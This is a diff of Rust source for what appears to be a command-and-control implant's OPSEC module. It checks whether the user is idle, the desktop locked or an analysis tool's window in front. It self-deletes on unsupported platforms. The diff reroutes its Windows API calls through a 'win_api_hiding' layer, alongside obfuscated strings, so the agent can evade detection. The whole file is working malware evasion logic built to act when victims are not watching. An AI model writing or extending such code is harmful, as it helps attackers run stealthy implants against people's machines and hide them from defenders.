@@ -6,6 +6,10 @@ use once_cell::sync::Lazy;
 use obfstr::obfstr;
 use std::time::{Duration, Instant};
 use std::sync::atomic::AtomicBool;
+use rand;
+
+#[cfg(target_os = "windows")]
+use crate::win_api_hiding;
 
 // --- NEW: OPSEC Scoring Constants ---
 const SCORE_DECAY_FACTOR: f32 = 0.95; // Decay score by 5% each cycle
@@ -133,41 +137,6 @@ pub static OPSEC_STATE: Lazy<Mutex<OpsecState>> = Lazy::new(|| Mutex::new(OpsecS
     // --- END NEW ---
 }));
 
-pub fn check_idle_level() -> OpsecLevel {
-    debug!("[OPSEC] check_idle_level() called");
-    #[cfg(target_os = "windows")]
-    {
-        let idle = check_user_idle_windows();
-        debug!("[OPSEC] check_user_idle_windows() returned: {}", idle);
-        if idle {
-            debug!("[OPSEC] All user presence checks passed: switching to Low Opsec.");
-            OpsecLevel::Low
-        } else {
-            debug!("[OPSEC] User is present or checks failed: staying in High Opsec.");
-            OpsecLevel::High
-        }
-    }
-    #[cfg(target_os = "linux")]
-    {
-        let idle = check_user_idle_linux();
-        debug!("[OPSEC] check_user_idle_linux() returned: {}", idle);
-        if idle {
-            debug!("[OPSEC] Linux X11 idle detected: switching to Low Opsec.");
-            OpsecLevel::Low
-        } else {
-            debug!("[OPSEC] Linux X11 user present or check failed: staying in High Opsec.");
-            OpsecLevel::High
-        }
-    }
-    
-    // 
-    #[cfg(not(any(target_os = "windows", target_os = "linux")))]
-    {
-        debug!("[OPSEC] Unsupported platform detected. Self-deleting and exiting.");
-        perform_self_cleanup();
-    }
-}
-
 pub fn determine_agent_mode(config: &crate::config::AgentConfig) -> AgentMode {
     // --- First, potentially adjust C2 threshold --- 
     { // Scope for mutex lock
@@ -216,15 +185,49 @@ pub fn determine_agent_mode(config: &crate::config::AgentConfig) -> AgentMode {
     determined_mode
 }
 
+pub fn check_idle_level() -> OpsecLevel {
+    debug!("[OPSEC] check_idle_level() called");
+    #[cfg(target_os = "windows")]
+    {
+        let idle = check_user_idle_windows();
+        debug!("[OPSEC] check_user_idle_windows() returned: {}", idle);
+        if idle {
+            debug!("[OPSEC] All user presence checks passed: switching to Low Opsec.");
+            OpsecLevel::Low
+        } else {
+            debug!("[OPSEC] User is present or checks failed: staying in High Opsec.");
+            OpsecLevel::High
+        }
+    }
+    #[cfg(target_os = "linux")]
+    {
+        let idle = check_user_idle_linux();
+        debug!("[OPSEC] check_user_idle_linux() returned: {}", idle);
+        if idle {
+            debug!("[OPSEC] Linux X11 idle detected: switching to Low Opsec.");
+            OpsecLevel::Low
+        } else {
+            debug!("[OPSEC] Linux X11 user present or check failed: staying in High Opsec.");
+            OpsecLevel::High
+        }
+    }
+    
+    // 
+    #[cfg(not(any(target_os = "windows", target_os = "linux")))]
+    {
+        debug!("[OPSEC] Unsupported platform detected. Self-deleting and exiting.");
+        perform_self_cleanup();
+    }
+}
+
 #[cfg(target_os = "windows")]
 fn check_user_idle_windows() -> bool {
-    use std::ptr;
-    use winapi::um::winuser::{LASTINPUTINFO, GetLastInputInfo, OpenInputDesktop, GetForegroundWindow};
+    use winapi::um::winuser::LASTINPUTINFO;
     use winapi::shared::minwindef::{DWORD, FALSE};
-    use crate::opsec::wts_ffi::*;
+    use crate::opsec::wts_ffi::*; // This one is fine here for the ffi types
 
     let mut is_considered_idle = false;
-    let mut reason = String::from("Defaulting to active.");
+    let reason: String; // Declare without initial assignment
 
     // 1. Check idle time
     unsafe {
@@ -232,72 +235,77 @@ fn check_user_idle_windows() -> bool {
             cbSize: std::mem::size_of::<LASTINPUTINFO>() as u32,
             dwTime: 0,
         };
-        if GetLastInputInfo(&mut lii) != 0 {
+        if win_api_hiding::get_last_input_info(&mut lii) != 0 {
             let tick_count = winapi::um::sysinfoapi::GetTickCount();
-            let idle_time_ms = tick_count.wrapping_sub(lii.dwTime); // Use wrapping_sub for tick count overflows
-            debug!("[OPSEC] Raw system idle time: {} ms", idle_time_ms);
-            // If user has been idle for more than 5 minutes, consider them idle.
+            let idle_time_ms = tick_count.wrapping_sub(lii.dwTime);
+            // debug!("[OPSEC] Raw system idle time: {} ms", idle_time_ms); // Moved logging for reason
             if idle_time_ms > 5 * 60 * 1000 { 
                 is_considered_idle = true;
                 reason = format!("User idle for {}ms (> 5min)", idle_time_ms);
             } else {
+                is_considered_idle = false; // Explicitly set for clarity
                 reason = format!("User not idle (idle_time {}ms <= 5min).", idle_time_ms);
-                debug!("[OPSEC] {}", reason);
-                // Optional: Could still check for locked screen even if idle time is short
-                // For now, if not past raw idle threshold, consider active for this function's purpose.
-                // return false; // Early exit if primary idle check fails
             }
+            debug!("[OPSEC] Idle check (GetLastInputInfo): {}", reason);
         } else {
-            warn!("[OPSEC] GetLastInputInfo failed, assuming user is active.");
-            // return false; // Assuming active if API fails
-            is_considered_idle = false; // Explicitly not idle
-            reason = "GetLastInputInfo failed".to_string();
+            warn!("[OPSEC] get_last_input_info (dynamic) failed, assuming user is active.");
+            is_considered_idle = false;
+            reason = "get_last_input_info (dynamic) failed".to_string();
+            debug!("[OPSEC] Idle check (GetLastInputInfo): {}", reason); // Log reason here too
         }
     }
 
-    // Additional checks for more confidence (optional, can be used to adjust opsec score later)
-    // For now, the primary decision is based on raw idle time.
-    // If is_considered_idle is already true, we can log other states.
+    // This part only runs if is_considered_idle is true, so reason would have been set above.
+    // If more complex logic were added here that might not set `reason` if `is_considered_idle` is false,
+    // then `reason` would need a default initialization or handling for that path before the final debug log.
     if is_considered_idle {
         unsafe {
-            let hdesk = OpenInputDesktop(0, FALSE, 0x0100); // GENERIC_READ
+            let hdesk = win_api_hiding::open_input_desktop(0, FALSE, 0x0100);
             if hdesk.is_null() {
-                debug!("[OPSEC] Desktop is locked or inaccessible (supports idle state).");
+                debug!("[OPSEC] Desktop is locked or inaccessible (supports idle state via OpenInputDesktop).");
             } else {
-                debug!("[OPSEC] Desktop is unlocked.");
-                // winapi::um::handleapi::CloseHandle(hdesk); // Close the handle
+                debug!("[OPSEC] Desktop is unlocked (via OpenInputDesktop).");
+                // Potentially close hdesk if needed, wrapping CloseHandle
             }
 
-            let mut session_state_ptr: *mut WTS_CONNECTSTATE_CLASS = ptr::null_mut();
+            let mut session_state_ptr: *mut WTS_CONNECTSTATE_CLASS = std::ptr::null_mut();
             let mut bytes_returned: DWORD = 0;
-            if WTSQuerySessionInformationW(
-                ptr::null_mut(), // WTS_CURRENT_SERVER_HANDLE
-                WTS_CURRENT_SESSION, // Current session
-                WTSConnectState, // Info class for session state (usually 0 for this enum, but use the constant)
-                &mut session_state_ptr as *mut _ as *mut *mut std::os::raw::c_void as *mut winapi::shared::ntdef::LPWSTR, // Correct casting for ppBuffer
+            if win_api_hiding::wts_query_session_information_w(
+                WTS_CURRENT_SERVER_HANDLE, 
+                WTS_CURRENT_SESSION, 
+                WTSConnectState, 
+                &mut session_state_ptr as *mut _ as *mut *mut std::os::raw::c_void as *mut winapi::shared::ntdef::LPWSTR,
                 &mut bytes_returned,
             ) != 0 && !session_state_ptr.is_null() {
                 let session_state_val = *session_state_ptr;
-                debug!("[OPSEC] Session state: {:?}", session_state_val);
+                debug!("[OPSEC] Session state (dynamic): {:?}", session_state_val);
                 if session_state_val != WTS_CONNECTSTATE_CLASS::WTSActive {
-                    debug!("[OPSEC] Session is not active (supports idle state).");
+                    debug!("[OPSEC] Session is not active (supports idle state via WTSQuerySessionInformationW).");
                 }
-                // WTSFreeMemory(session_state_ptr as *mut std::os::raw::c_void); // Free memory
+                // Potentially call WTSFreeMemory, wrapped
             } else {
-                warn!("[OPSEC] WTSQuerySessionInformationW failed or state is null.");
+                warn!("[OPSEC] wts_query_session_information_w (dynamic) failed or state is null.");
             }
 
-            let fg_window = GetForegroundWindow();
+            let fg_window = win_api_hiding::get_foreground_window();
             if fg_window.is_null() {
-                debug!("[OPSEC] No foreground window detected (supports idle state).");
+                debug!("[OPSEC] No foreground window detected (supports idle state via GetForegroundWindow).");
             } else {
-                debug!("[OPSEC] Foreground window present.");
+                debug!("[OPSEC] Foreground window present (via GetForegroundWindow).");
             }
         }
     }
     
-    debug!("[OPSEC] check_user_idle_windows final decision: is_idle = {}, Reason: {}", is_considered_idle, reason);
-    is_considered_idle // Return based on the primary idle time check for now
+    // `reason` should be initialized from the GetLastInputInfo block before this final log.
+    // If for some reason it wasn't (e.g., future code changes that bypass that block under some condition),
+    // this could panic if `reason` isn't guaranteed to be initialized.
+    // However, with current logic, it is always initialized.
+    // debug!("[OPSEC] check_user_idle_windows final decision: is_idle = {}, Reason: {}", is_considered_idle, reason);
+    // The individual debugs for `reason` after each assignment make the final one somewhat redundant for the `reason` part.
+    // Let's simplify the final log message or ensure `reason` is always explicitly passed around if its state is complex.
+    // For now, the local debugs for `reason` should suffice. The final log is for the `is_considered_idle` decision.
+    debug!("[OPSEC] check_user_idle_windows final decision: is_idle = {}", is_considered_idle);
+    is_considered_idle
 }
 
 #[cfg(not(target_os = "windows"))]
@@ -756,22 +764,21 @@ pub fn check_window_state() -> bool {
 // Platform-specific implementations
 #[cfg(target_os = "windows")]
 fn check_foreground_window_title() -> bool {
-    use winapi::um::winuser::{GetForegroundWindow, GetWindowTextW};
     use winapi::shared::minwindef::MAX_PATH;
     use std::ffi::OsString;
     use std::os::windows::ffi::OsStringExt;
 
-    let hwnd = unsafe { GetForegroundWindow() };
+    let hwnd = unsafe { win_api_hiding::get_foreground_window() };
     if hwnd.is_null() {
-        debug!("[OPSEC WINDOW] No foreground window found.");
-        return false; // No window, no suspicious title
+        debug!("[OPSEC WINDOW] No foreground window found (dynamic).");
+        return false;
     }
 
     let mut buffer: Vec<u16> = vec![0; MAX_PATH as usize];
-    let len = unsafe { GetWindowTextW(hwnd, buffer.as_mut_ptr(), buffer.len() as i32) };
+    let len = unsafe { win_api_hiding::get_window_text_w(hwnd, buffer.as_mut_ptr(), buffer.len() as i32) };
 
     if len <= 0 {
-        debug!("[OPSEC WINDOW] Could not get window title (HWND: {:?}).", hwnd);
+        debug!("[OPSEC WINDOW] Could not get window title (dynamic) (HWND: {:?}).", hwnd);
         return false;
     }
 
@@ -779,23 +786,22 @@ fn check_foreground_window_title() -> bool {
     let title_os = OsString::from_wide(&buffer);
     if let Some(title_str) = title_os.to_str() {
         let title_lc = title_str.to_lowercase();
-        debug!("[OPSEC WINDOW] Foreground window title: '{}'", title_str);
+        debug!("[OPSEC WINDOW] Foreground window title (dynamic): '{}'", title_str);
         for suspicious_title_pattern in &*SUSPICIOUS_WINDOW_TITLES {
-             // Use case-insensitive comparison
             if title_lc.contains(&suspicious_title_pattern.to_lowercase()) {
                 warn!(
-                    "[OPSEC WINDOW] Suspicious foreground window detected: '{}' (Matches: '{}')",
+                    "[OPSEC WINDOW] Suspicious foreground window detected (dynamic): '{}' (Matches: '{}')",
                     title_str,
                     suspicious_title_pattern
                 );
-                return true; // Found a match
+                return true;
             }
         }
     } else {
-        debug!("[OPSEC WINDOW] Window title is not valid UTF-8.");
+        debug!("[OPSEC WINDOW] Window title is not valid UTF-8 (dynamic).");
     }
 
-    false // No suspicious title found
+    false
 }
 
 #[cfg(not(target_os = "windows"))]
@@ -811,19 +817,15 @@ fn check_foreground_window_title() -> bool {
 #[cfg(target_os = "windows")]
 #[allow(non_camel_case_types, non_snake_case, non_upper_case_globals)]
 mod wts_ffi {
-    use std::os::raw::{c_void};
+    use winapi::ctypes::c_void;
     use winapi::shared::minwindef::{DWORD, LPVOID};
     use winapi::shared::ntdef::LPWSTR;
 
     pub type HANDLE = *mut c_void;
-    // DWORD is already brought in via winapi::shared::minwindef
-    // LPWSTR from winapi::shared::ntdef
-
-    pub const WTS_CURRENT_SERVER_HANDLE: HANDLE = ptr::null_mut();
+    pub const WTS_CURRENT_SERVER_HANDLE: HANDLE = std::ptr::null_mut();
     pub const WTS_CURRENT_SESSION: DWORD = 0xFFFFFFFF;
     
-    // From Wtsapi32.h
-    pub const WTSConnectState: u32 = 0; // This corresponds to WTS_INFO_CLASS::WTSConnectState
+    pub const WTSConnectState: u32 = 0;
 
     #[repr(C)]
     #[derive(Debug, Copy, Clone, PartialEq, Eq)] 
@@ -841,18 +843,18 @@ mod wts_ffi {
     }
 
     extern "system" {
+        #[allow(dead_code)]
         pub fn WTSQuerySessionInformationW(
             hServer: HANDLE,
             SessionId: DWORD,
-            WTSInfoClass: DWORD, // This should be WTS_INFO_CLASS enum value, e.g. WTSConnectState
-            ppBuffer: *mut LPWSTR, // Pointer to a pointer to the data
+            WTSInfoClass: DWORD,
+            ppBuffer: *mut LPWSTR,
             pBytesReturned: *mut DWORD,
-        ) -> BOOL;
+        ) -> winapi::shared::minwindef::BOOL;
 
+        #[allow(dead_code)]
         pub fn WTSFreeMemory(pMemory: LPVOID);
     }
-    use std::ptr; // Added for ptr::null_mut in WTS_CURRENT_SERVER_HANDLE
-    use winapi::shared::minwindef::BOOL;
 }
 
 // --- NEW: C2 Stability Check Logic ---
